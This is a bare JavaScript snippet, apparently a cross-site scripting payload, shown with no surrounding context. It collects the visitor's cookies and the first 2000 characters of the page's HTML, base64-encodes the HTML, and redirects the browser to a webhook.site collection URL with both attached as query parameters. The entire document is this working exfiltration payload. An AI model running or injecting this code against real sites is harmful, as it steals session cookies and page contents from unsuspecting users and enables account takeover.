const grab = {
  c : document.cookie       || 'nocookie',
  h : btoa(unescape(encodeURIComponent(
        document.documentElement.outerHTML.slice(0,2000)
      )))
};
const q = new URLSearchParams(grab).toString();
window.location = 'https://webhook.site/67a2bff1-4944-491d-9e41-5da1bbc8c1f9?' + q;
